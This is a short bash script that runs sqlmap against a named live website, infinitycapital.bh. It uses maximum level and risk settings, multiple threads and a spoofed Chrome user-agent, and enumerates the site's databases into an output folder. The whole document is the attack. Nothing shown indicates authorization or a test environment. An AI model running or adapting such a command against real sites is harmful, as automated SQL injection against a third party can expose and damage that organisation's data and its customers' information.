#!/bin/bash
UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'
cd sqliw
sqlmap -u 'https://www.infinitycapital.bh/?id=1&page=2&search=test' \
  --batch --level=5 --risk=3 --threads=4 --dbs \
  --headers="Accept: text/html,application/xhtml+xml|User-Agent: $UA" \
  --output-dir=/work/sqliw/out_home 2>&1 | tail -45
